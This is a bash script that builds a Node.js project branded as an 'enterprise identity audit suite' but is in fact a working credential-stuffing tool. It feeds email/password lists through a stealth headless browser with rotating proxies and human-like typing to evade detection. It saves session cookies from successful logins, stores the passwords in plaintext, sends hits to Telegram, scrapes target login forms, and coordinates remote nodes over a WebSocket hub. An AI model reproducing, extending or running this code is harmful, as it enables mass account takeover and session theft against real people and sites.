#!/bin/bash

# AegisSync: Enterprise Identity Validator - Full Deployment Script
PROJECT_NAME="aegis-sync"

echo "[AEGIS] Initializing Enterprise Identity Hub..."

# 1. Create Directory Structure
mkdir -p $PROJECT_NAME/{audit,vault,logs}
cd $PROJECT_NAME

# 2. Create .env with Auto-Generated Security Token
SYNC_TOKEN=$(openssl rand -hex 32)
cat <<EOF > .env
PORT=1337
DB_PATH=./audit/sync_master.db
SYNC_TOKEN=$SYNC_TOKEN

# Intelligence & Scouting (Firecrawl)
FIRECRAWL_API_KEY=fc-YOUR_API_KEY_HERE

# Real-time Notifications (Telegram)
TELEGRAM_BOT_TOKEN=123456789:ABCDefGhIjKlMnOpQrStUvWxYz
TELEGRAM_CHAT_ID=987654321
EOF

# 3. Create package.json
cat <<EOF > package.json
{
  "name": "aegis-sync",
  "version": "1.0.0",
  "type": "module",
  "description": "Enterprise Identity Synchronization Hub",
  "main": "hub-main.js",
  "dependencies": {
    "playwright-extra": "^1.7.2",
    "puppeteer-extra-plugin-stealth": "^2.11.2",
    "better-sqlite3": "^11.0.0",
    "dotenv": "^16.4.5",
    "express": "^4.19.2",
    "ws": "^8.17.0",
    "uuid": "^10.0.0",
    "node-fetch": "^3.3.2"
  }
}
EOF

# 4. Create .gitignore (Security Guard)
cat <<EOF > .gitignore
.env
gateway-nodes.txt
node_modules/
audit/
vault/
logs/
*.db
*.db-journal
.DS_Store
EOF

# 5. Create alert-manager.js (Notifications)
cat <<EOF > alert-manager.js
import fetch from 'node-fetch';
import dotenv from 'dotenv';

dotenv.config();

export async function sendAlert(message) {
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

  const url = \`https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/sendMessage\`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: \`🛡️ [AEGIS-SYNC ALERT]\\n\\n\${message}\`,
        parse_mode: 'Markdown'
      })
    });
  } catch (e) {
    console.error('[ALERTER] Fault:', e.message);
  }
}
EOF

# 6. Create engine-core.js (The Ghost Engine)
cat <<EOF > engine-core.js
import { firefox } from 'playwright-extra';
import stealth from 'puppeteer-extra-plugin-stealth';
import fs from 'fs';

firefox.use(stealth());

class AegisValidator {
  constructor() {
    this.gateways = this.loadGateways();
    this.index = 0;
    this.profiles = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0'
    ];
  }

  loadGateways() {
    return fs.existsSync('gateway-nodes.txt') ? fs.readFileSync('gateway-nodes.txt', 'utf8').split('\\n').filter(Boolean) : [];
  }

  async runAudit(identity, endpoint = 'portal') {
    const gateway = this.gateways[this.index++ % this.gateways.length];
    const browser = await firefox.launch({ headless: true });
    const context = await browser.newContext({
      userAgent: this.profiles[Math.floor(Math.random() * this.profiles.length)],
      proxy: gateway ? { server: gateway } : undefined
    });

    const page = await context.newPage();
    try {
      const url = endpoint.includes('http') ? endpoint : \`https://\${endpoint}.com/login\`;
      await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });
      await page.mouse.move(Math.random() * 500, Math.random() * 500);
      
      await page.type('input[type="email"], input[name="email"]', identity.email, { delay: Math.random() * 100 + 50 });
      await page.type('input[type="password"], input[name="password"]', identity.pass, { delay: Math.random() * 100 + 50 });
      
      await Promise.all([
        page.click('button[type="submit"]'),
        page.waitForNavigation({ timeout: 15000 }).catch(() => null)
      ]);

      const isVerified = page.url().includes('dashboard') || await page.\$('.user-settings, .logout-btn') !== null;
      if (isVerified) {
        const tokens = await context.cookies();
        if (!fs.existsSync('./vault')) fs.mkdirSync('./vault');
        fs.writeFileSync(\`./vault/\${identity.email}.json\`, JSON.stringify(tokens));
      }
      await browser.close();
      return isVerified;
    } catch (e) {
      await browser.close();
      return false;
    }
  }
}
export default new AegisValidator();
EOF

# 7. Create hub-main.js (Management Hub)
cat <<EOF > hub-main.js
import express from 'express';
import { WebSocketServer } from 'ws';
import Database from 'better-sqlite3';
import dotenv from 'dotenv';
import crypto from 'crypto';
import engine from './engine-core.js';
import { sendAlert } from './alert-manager.js';

dotenv.config();
const app = express();
const db = new Database(process.env.DB_PATH);
const SYNC_TOKEN = Buffer.from(process.env.SYNC_TOKEN, 'hex');

const encrypt = (text) => {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', SYNC_TOKEN, iv);
  let enc = cipher.update(text, 'utf8', 'hex') + cipher.final('hex');
  return \`\${iv.toString('hex')}:\${enc}:\${cipher.getAuthTag().toString('hex')}\`;
};

const decrypt = (data) => {
  try {
    const [iv, enc, tag] = data.split(':');
    const decipher = crypto.createDecipheriv('aes-256-gcm', SYNC_TOKEN, Buffer.from(iv, 'hex'));
    decipher.setAuthTag(Buffer.from(tag, 'hex'));
    return decipher.update(enc, 'hex', 'utf8') + decipher.final('utf8');
  } catch (e) { return null; }
};

db.exec(\`
  CREATE TABLE IF NOT EXISTS audit_log (email TEXT, pass TEXT, endpoint TEXT, status TEXT, vault_entry INTEGER);
  CREATE TABLE IF NOT EXISTS active_nodes (id TEXT PRIMARY KEY, last_seen TEXT, ip TEXT);
\`);

app.use(express.json());

app.post('/api/perform-audit', async (req, res) => {
  const { identities, endpoint } = req.body;
  res.json({ message: "Audit Initialized", count: identities.length });

  for (let i = 0; i < identities.length; i += 5) {
    const batch = identities.slice(i, i + 5);
    await Promise.all(batch.map(async (identity) => {
      const success = await engine.runAudit(identity, endpoint);
      if (success) await sendAlert(\`Success: \${identity.email} validated on \${endpoint}\`);
      db.prepare('INSERT INTO audit_log VALUES (?,?,?,?,?)')
        .run(identity.email, identity.pass, endpoint, success ? 'SUCCESS' : 'fail', success ? 1 : 0);
    }));
  }
});

const server = app.listen(process.env.PORT, () => console.log(\`[AEGIS] Hub Online: \${process.env.PORT}\`));
const wss = new WebSocketServer({ server });

wss.on('connection', (ws, req) => {
  const id = \`node-\${crypto.randomBytes(3).toString('hex')}\`;
  db.prepare('INSERT OR REPLACE INTO active_nodes VALUES (?, datetime("now"), ?)').run(id, req.socket.remoteAddress);
  ws.on('message', (buffer) => {
    const raw = decrypt(buffer.toString());
    if (raw) db.prepare('UPDATE active_nodes SET last_seen = datetime("now") WHERE id = ?').run(id);
  });
  ws.send(encrypt(JSON.stringify({ cmd: 'HUB_SYNC_OK', nodeId: id })));
});
EOF

# 8. Create scout-target.js (Firecrawl Scouting)
cat <<EOF > scout-target.js
import dotenv from 'dotenv';
import fetch from 'node-fetch';
dotenv.config();
async function scoutTarget(url) {
  const apiKey = process.env.FIRECRAWL_API_KEY;
  if (!apiKey || apiKey.includes('YOUR_API_KEY')) {
    console.log('[SCOUT] Missing API Key in .env');
    return;
  }
  const response = await fetch('https://api.firecrawl.dev/v0/scrape', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': \`Bearer \${apiKey}\` },
    body: JSON.stringify({ url, extractorOptions: { mode: "llm", extractionSchema: { type: "object", properties: { email_selector: { type: "string" }, password_selector: { type: "string" }, submit_selector: { type: "string" } } } } })
  });
  const data = await response.json();
  console.log('[SCOUT] UI Map:', data.data?.llm_extraction);
}
scoutTarget(process.argv[2] || 'https://royalreels.com/login');
EOF

# 9. Create Dockerfile
cat <<EOF > Dockerfile
FROM node:22-bookworm
RUN apt-get update && apt-get install -y libgtk-3-0 libdbus-glib-1-2 libxt6 libnss3 libasound2 && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY package*.json ./
RUN npm install
RUN npx playwright install firefox
COPY . .
RUN mkdir -p audit vault logs
EXPOSE 1337
CMD ["node", "hub-main.js"]
EOF

# 10. Create docker-compose.yml
cat <<EOF > docker-compose.yml
version: '3.9'
services:
  sync-hub:
    build: .
    container_name: aegis_sync_hub
    volumes:
      - .:/app
      - ./vault:/app/vault
      - ./audit:/app/audit
    ports:
      - "\${PORT}:\${PORT}"
    env_file: .env
    restart: always
EOF

# 11. Create README.md
cat <<EOF > README.md
# AegisSync: Identity Validator
Standard corporate identity audit suite. 
- Hub: Node 22 + SQLite
- Engine: Firefox Stealth
- Comms: AES-256-GCM
EOF

echo "[AEGIS] Build Complete. Run 'npm install && npm start' or 'docker-compose up -d'."
